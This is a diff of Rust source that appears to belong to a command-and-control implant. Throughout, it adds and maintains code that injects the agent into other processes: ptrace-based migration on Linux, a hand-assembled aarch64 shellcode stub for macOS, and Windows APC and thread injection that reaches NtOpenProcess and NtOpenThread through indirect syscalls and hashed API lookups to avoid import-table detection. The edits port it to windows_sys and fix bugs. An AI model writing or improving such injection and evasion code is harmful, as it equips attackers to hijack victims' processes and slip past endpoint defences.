-            #[cfg(target_arch = "x86_64")]
+            #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
+            {
+                unsafe {
+                    libc::ptrace(
+                        libc::PTRACE_DETACH,
+                        target_pid as libc::pid_t,
+                        0usize,
+                        0usize,
+                    )
+                };
+                anyhow::bail!(
+                    "Linux process migration via ptrace is only implemented for x86_64 and aarch64"
+                );
+            }
+
+            #[cfg(any(target_arch = "x86_64", target_arch = "aarch64"))]
             Ok(())
         }
     }
@@ -1533,6 +2108,10 @@ fn build_macos_shm_stub_aarch64_impl(binary_addr: u64, binary_len: usize) -> Vec
     insts.push(0x3900019F);
     // mov x0, x0 (pid for itoa, already in x0 from getpid)
 
+    // Initialize the decimal divisor before the first itoa loop.
+    // movz x13, #10 (divisor for decimal conversion)
+    insts.push(0xD280014D);
+
     // itoa loop: convert pid to decimal digits right-to-left
     let itoa_start = insts.len();
     // sub x12, x12, #1
@@ -1687,9 +2266,7 @@ fn aarch64_load_64(insts: &mut Vec<u32>, rd: u32, val: u64) {
 
 #[cfg(windows)]
 pub fn migrate_to_process(target_pid: u32) -> Result<()> {
-    use winapi::um::winnt::{
-        PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
-    };
+    use windows_sys::Win32::System::Threading::{PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE};
 
     // Read the current agent's own executable so we can re-inject ourselves.
     let agent_path =
@@ -1698,12 +2275,16 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
         anyhow::anyhow!("failed to read agent binary {}: {e}", agent_path.display())
     })?;
 
-    let access = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD;
+    let access = PROCESS_VM_OPERATION
+        | PROCESS_VM_WRITE
+        | PROCESS_VM_READ
+        | PROCESS_CREATE_THREAD
+        | PROCESS_QUERY_INFORMATION;
 
     // OpenProcess → NtOpenProcess (indirect syscall, no IAT entry)
     let process = unsafe {
-        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
         let mut client_id = [0u64; 2];
         client_id[0] = target_pid as u64;
         let mut h_proc: usize = 0;
@@ -1812,16 +2393,15 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
     //     that thread next enters an alertable wait state).
     // The original implementation incorrectly spawned a *new* svchost.exe
     // instead of injecting into the supplied `pid`.
-    use winapi::um::tlhelp32::{TH32CS_SNAPTHREAD, THREADENTRY32};
-    use winapi::um::winnt::{
-        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_VM_OPERATION,
-        PROCESS_VM_WRITE, THREAD_SET_CONTEXT,
-    };
+    use windows_sys::Win32::System::Diagnostics::ToolHelp::{TH32CS_SNAPTHREAD, THREADENTRY32};
+    use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
+    use windows_sys::Win32::System::Threading::{PROCESS_VM_OPERATION, PROCESS_VM_WRITE, THREAD_SET_CONTEXT};
+    use crate::win_types::PAGE_READWRITE;
 
     unsafe {
         // OpenProcess → NtOpenProcess (indirect syscall, no IAT entry)
-        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
         let mut client_id = [0u64; 2];
         client_id[0] = pid as u64;
         let mut hprocess: usize = 0;
@@ -1900,7 +2480,7 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
         );
         let protect_status_code = protect_status.as_ref().map(|s| *s).unwrap_or(-1);
         if protect_status_code < 0 {
-            log::warn!(
+            tracing::warn!(
                 "apc_inject: NtProtectVirtualMemory to RX failed for pid={}, memory remains RW (not executable): status={:?}",
                 pid, protect_status
             );
@@ -1918,13 +2498,13 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
         let thread32_next: FnThread32Next = pm_resolve_api(HASH_THREAD32NEXT)?;
 
         let snapshot = create_snapshot(TH32CS_SNAPTHREAD, 0);
-        if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
+        if snapshot == crate::win_types::INVALID_HANDLE_VALUE as *mut _ {
             return Err(anyhow::anyhow!(
                 "apc_inject: CreateToolhelp32Snapshot failed"
             ));
         }
 
-        let apc_routine: winapi::um::winnt::PAPCFUNC = std::mem::transmute(remote_mem);
+        let apc_routine: windows_sys::Win32::Foundation::PAPCFUNC = std::mem::transmute(remote_mem);
         let apc_routine_addr = apc_routine.map(|f| f as usize as u64).unwrap_or(0);
         if apc_routine_addr == 0 {
             pe_resolve::close_handle(snapshot);
@@ -1940,10 +2520,10 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
             loop {
                 if entry.th32OwnerProcessID == pid {
                     // NtOpenThread (indirect syscall, no IAT entry).
-                    let mut obj_attr_thread: winapi::shared::ntdef::OBJECT_ATTRIBUTES =
+                    let mut obj_attr_thread: crate::win_types::OBJECT_ATTRIBUTES =
                         std::mem::zeroed();
                     obj_attr_thread.Length =
-                        std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+                        std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
                     let mut cid_thread: u64 = entry.th32ThreadID as u64;
                     let mut hthread: usize = 0;
                     let nt_open = crate::syscall!(
@@ -2007,6 +2587,6 @@ pub fn select_and_inject(
     method: Option<InjectionMethod>,
 ) -> anyhow::Result<()> {
     let method = method.unwrap_or(InjectionMethod::NtCreateThread);
-    log::info!("Dispatching injection using method: {:?}", method);
+    tracing::info!("Dispatching injection using method: {:?}", method);
     crate::injection::inject_with_method(method, pid, payload)
 }
